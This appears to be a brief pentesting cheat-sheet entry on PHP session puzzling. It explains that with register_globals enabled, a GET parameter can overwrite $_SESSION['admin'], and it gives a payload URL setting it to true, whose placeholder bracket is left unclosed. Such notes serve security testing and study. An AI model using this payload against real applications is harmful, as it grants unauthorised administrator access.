#session_puzzlong #php 

When `register_globals` is enabled it is possible to overwrite PHP variables with a GET request.

Application Code:
```php
$_SESSION["admin"]=false
```

Payload:
```http
https://[TARGET_IP/?_SESSION["admin"]=true
```